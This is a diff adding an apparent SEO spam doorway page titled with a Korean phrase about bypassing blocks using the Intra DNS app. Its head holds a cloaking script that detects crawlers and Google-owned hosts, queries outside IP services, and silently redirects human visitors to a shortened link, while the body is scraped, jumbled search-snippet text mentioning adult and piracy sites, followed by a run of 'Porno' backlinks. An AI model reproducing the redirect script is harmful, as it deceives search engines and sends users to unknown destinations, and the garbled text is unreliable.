@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>11398</title>
+</script>
+</head>
+<body>
+<h1>인트라 우회</h1>
+<p>Intra는 뉴스 사이트, 소셜 미디어 플랫폼 및 메시지 앱에 액세스하지 못하도록 차단하는 사이버 공격인 DNS 조작으로부터 사용자를 보호하며, 일부 피싱 및 멀웨어 ...14-Oct-2020 — 바로~ DNS암호화 방식을 채택하고 있는 무료어플 INTRA 앱 입니다. ​. 보통은 VPN 우회 방법을 쓰는데 이방법은 IP자체를 다른국가로 우회해서 쓰는 방법 ...07-Mar-2020 — 인트라(intra)라는 우회어플입니다. · 구글의 모기업으로 유명한 알파벳의 자회사 직소(Jigsaw)에서 개발한 앱으로, · DNS 서버에 IP주소 조회 통신을 ...01-Jun-2020 — 속도 빠른 DNS 우회 접속 애플리케이션 Intra입니다. 접속하려고 했던 웹페이지가 차단되어 접속할 수 없을 때가 종종 있습니다.19-Apr-2020 — 이 프로그램이 발표된 것은 2018년 경으로, 베네수엘라에서 소셜 미디어와 뉴스를 검열하던 것을 이 앱을 통해 우회할 수 있도록 서비스를 제공하며 ...07-Mar-2019 — 구글의 자회사 직소가 개발한 도메인네임서버(DNS) 보안강화 앱 '인트라(Intra)'가 인기를 끌고 있다. 알고 보니 정부의 불법사이트 차단의 우회 통로 ...크롬 사용자를 위한 https 차단 우회 크롬 확장으로 안전하고 빠르게 뚫기 ... 인트라는 DNS 서버에 IP 주소 조회 통신을 암호화하여 제3자에 의한 DNS 감시 및 조작을 ...13-Feb-2019 — 모바일 우회 Intra 어플(핸드폰 우회 앱) 모바일에서 어플 하나만 다운 및 설치하면 DNS연결을 암호화하여 DNS 차단에 대해 우회를 할 수 있습니다.07-Mar-2019 — 인트라 앱은 터치 한 번만으로 DNS 서버를 구글 또는 클라우드플레어로 변경해 https 차단을 간단하게 우회할 수 있다. 이는 https 차단을 우회하는 ...02-Sept-2020 — intra 어플은 HTTPS 우회 어플입니다. 무료로 구글 플레이 스토어에서 다운로드 할 수 있기 때문에 다른 경로로 설치하는 우회 어플 보다는 신빙성이 ...7 days ago — 인트라 어플 질문드립니다 - 디지털 (컴퓨터/폰/IT) - 에펨코리아 모바일의 경우 강력하게 추천드릴 수 있는 VPN 우회접속 앱이 두가지가 있다 Intra ...4 days ago — 어플 인트라. - 보안뉴스 DNS 우회 모바일 최강 어플 인트라(Intra); 구글의 모기업인 알파벳의 자회사 직소가 발표한 보안 앱 ...인트라 앱은 VPN 우회 어플은 아니지만 DNS부분을 암호화하고 연결을 여러 번 나누어 보냄으로써 SNI차단 등의 검열을 못 하게 막는 앱입니다.25-Jun-2019 — 정부의 https 차단 이후로 인트라가 실시간 1위 앱으로 올라왔으며, 스나이퍼, 유니콘 줄줄이 https 차단 우회 어플들이 올라왔고 많은 분들이 사용을 ...27-Sept-2020 — 실제 유니콘이나 인트라로 뚫리던 사이트들이제 하나 둘씩 막히기 시작함https://n.news.naver.com/article/366/0000426776아마 작년에 언론에서나온 ...09-Apr-2022 — 근데 나도 가끔 인트라로 안될때가 있긴 해 인트라로 우회 안될땐 ... 나도 유플쓰는데 우회 잘안되더라 intra는 안돼서 유니콘써봤는데 유니콘은 됨.Chrome 웹 스토어. 확장 프로그램, 테마, 앱으로 데스크톱 컴퓨터에서 Chrome을 맞춤설정합니다. Chrome에 새로운 기능 추가. Chrome에 확장 프로그램을 설치하여 새 ...7 days ago — 코나는 현대차의 첫 소형 SUV(스포츠유틸리티차량)다. 2014년 공개한 콘셉트카 '인트라도'를 바탕으로 만들어졌다. 특히 출시 당시 부회장이던 정의선 ...동두천시와 연천군을 연결하는 국도 3호선 대체 우회도로의 마지막 미개통 구간인 ... HMM이 인천항에서 신규 인트라아시아 항로인 'ICN(Intra-Asia Cross Network)' ...15-Jul-2019 — 해외사이트를 자주 이용하시는 분들에게는 정말 유용한 포스팅이 될 겁니다. 자 그럼 아이피 우회하는 방법에 대해 소개해드리겠습니다. 우선 'Intra' 앱 ...Showing 인트라 우회 Videos. 크롬으로 야동 스마트하게 보는 3가지 방법 - 게스트/시크릿 모드, VPN.17 hours ago — 인트라 앱은 VPN 우회 어플은 아니지만 DNS부분을 암호화하고 연결을 여러 번 나누어 보냄으로써 SNI차단 …7 mar. 2020 — 인트라(intra)라는 우회어플 ...12 hours ago — 2021 — 즉, 모바일와 컴퓨터에서 인터넷 접속시 VPN 우회접속을 가능하게 해주는 무료 앱(프로그램)들과 이들의 간단한 사용방법까지 알아보도록 한다 ...8 hours ago — 유니콘 우회 안됨 3. 익스프레스 vpn 4. intra 막힘 5. Riseup VPN 사용법 유니콘 https 우회 PC …폰 허브 VPN 막힘 Phonehub Link 새주소 onestore.pe.11 hours ago — 2022 — 내부에서 Fake VPN 작동으로 우회를. ... 2022 — 주로 유니콘 HTTPS, ASPEAR, 프로텍트 HTTPS 우회앱, HTTPS Injector, Intra(인트라), ...12 hours ago — 모바일 크롬 Vpn 우회 29 iun. 2019 — 그부분은 무조건 VPN우회가 필요하다. 오페라미니 / 퍼핀 / 인트라 등을 깔아서 우회하시오.블루티비는 스포츠중계실시간 중계,해외축구중계,문자중계,EPL중계,라리가 중계,분데스리가중계,축구중계,농구중계,K리그중계,NBA중계 등 영상 또는 문자 중계를 감상 ...1 hour ago — 이 글에서는 툰코리아에 관련된 모든 안드로이드 우회 앱 – Intra 안드로이드용 Intra 링크 인트라(Intra)는 구 Google 아이디어였던 Jigsaw 개발팀이 ...9 hours ago — 이를 통해 dns차단은 우회 가능합니다. ... 최근에 사이트 차단 방식이 바뀐건지[유니콘 HTTPS]랑 [Intra(인트라)]같은 …이야기알뜰폰.16 hours ago — 인트라 키고 들가보셈. 거기 망한지가 언젠데. 드래곤볼 히토미 한글번역본 …acum 8 ore — 에서 Vpn 우회 접속하는방법 Pc기준 생활팁 히토미(hitomi) 히 ...미국 http wwwgoogle.com/webhp?hl=en 영국 국가별 구글 우회 접속하기 1. ... 구글의 자회사 직소가 개발한 도메인네임서버(DNS) 보안강화 앱인 '인트라'를 … 2020.유니콘 https 해킹으로부터 안전한 사이트 twitter.com/idhrlagodur #우회접속 ... 막힌 야동사이트 뚫기 유니콘 &amp; sniper 기존에 사용하던 vpn 우회어플 intra가 생각 ...더 영국 구글 링크 기묘한 영국 구글 링크 기묘한 전세계 193개국 구글 우회접속 ... 구글의 자회사 직소가 개발한 도메인네임서버(DNS) 보안강화 앱인 '인트라'를 …8 hours ago — 2021 — 오늘은 HTTP SNI 차단 우회 프로그램인 퍼핀브라우저를 소개해 ... 2019 — 그리고 인트라같은 vpn앱들은 되다 안되다 하는 경우 있는게 이건 ...9 hours ago — 이건 ip를 우회해주는 앱인데요, 마리망이 …24 apr. 2020 — 무료 우회 앱/크롬 무료 VPN 등 : 약관 자세히 보면 애초에 개인정보 가져간다 써있음ㅋ ...... 여캠 가슴 ᄏᄑᄋ ᄅᄋᄅ 나의 바다 나인 마미 표정 변화 이가은 아나운서 결혼 인트라 우회 안됨 도봉 운전 면허 학원 - none 여자 제복 그리기 예구리 엔플라잉 ...5j901..gws-wiz.0i131j0j0i10.tistory.com 폰허브 뚫는 법 1탄은 DPI 우회 프로그램 ... 호주,일본,미국 구글재팬 우회 Intra - Google Play 앱 정부가 막아버린 불법 ...주 소 : https:yaburi30.com 상 태 : 접속가능 – 접속안될시 vpn 혹은 우회 필요. ... 속도 빠른 DNS 우회 접속 애플리케이션 Intra입니다 접속하려고 했던 웹페이지 ...... Samsun is ilanlari sofor · افضل موسيقى اثناء ممارسة الجنس يوتيوب اطفال · 외국 구글 우회 안막힌 · G2b 안전입찰2 01 one view point 1 · C 구조체 선언문 ...13 hours ago — Access blocked sites Malaysia – Gadget kissjav는 왜 인트라로 우회가 안되냐 · ㅇㅇ(58 · Kissjav · HTTPS차단 우회하여 접속하는 방법 · 57 …56 minutes ago — 해당 프로그램은 우회없이 작동됩니다. 비동기식 요청을 사용해 매우 빠른 다운로드가 가능합니다. 필요한 속도에 따라 다운받을 수를 높여 주세요.... 풍운 만화 다운로드센터 · 아이폰 vpn 우회 방법 · تحميل ملف وورد للبلاك بورد تخصصی · Istanbul temperatur · Sidefer bebeklerde nasıl kullanılır ...... gasoline 인공지능 영어 번역기 누누 tv 29우회 Xps 원리 pdf online download ... Rf 온라인 machine guns manuals 토트넘 대 아인트라흐트 프랑크푸르트 순위 H ...... 고맙소 가사 【인트라 막힘】 CBLZHT 븐넷 헬 로그인 테이블의 내용 헬 로그인한 ... 헬븐넷 커뮤니티헬븐넷 검증헬븐넷 링크헬븐넷 막힘헬븐넷 우회헬븐넷 같은 …5 hours ago — DNS 우회 앱으로는 해결되지 않는다.ruliweb.com/community/board/300143/read/49307888 여기 댓글의 어느 대협께서 친절하게 설명해주신걸 보고 ...9 hours ago — 롬 갈아엎기, 간단한 우회, etc… 등등.8 nov. 2021 — 예전쓰던폰 공초안해뒀는데 계정 두개가 등록돼서그러냐,,,,, 왜그런데.11 dec.해당 프로그램은 우회없이 작동됩니다. 비동기식 요청을 사용해 매우 빠른 다운로드가 가능합니다. 필요한 속도에 따라 다운받을 수를 높여 주세요.7 hours ago — ... none 아라뱃길 근처 맛집 끄투 우회 마비노기 정령 계약 - 마비노기 ... 페르소나 5 스크램블 아인트라흐트 프랑크푸르트 선수 레이싱모델 발 ...... 독수리 사냥영상 · Çeşme otobüs bileti kamil koç · 구글 우회접속하기 ... 마인츠 05 대 아인트라흐트 프랑크푸르트 통계 · 클래식 법사 특성 · 부과하다 뜻 ...9 hours ago — Intra 앱 막힘 toonkor피그 에이브이 우회 판도라티비 다운로드 12 호 태풍 민들레. Tarih: s-8:6 -d1:6:2023x. Video No Straight Roads Trailer ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
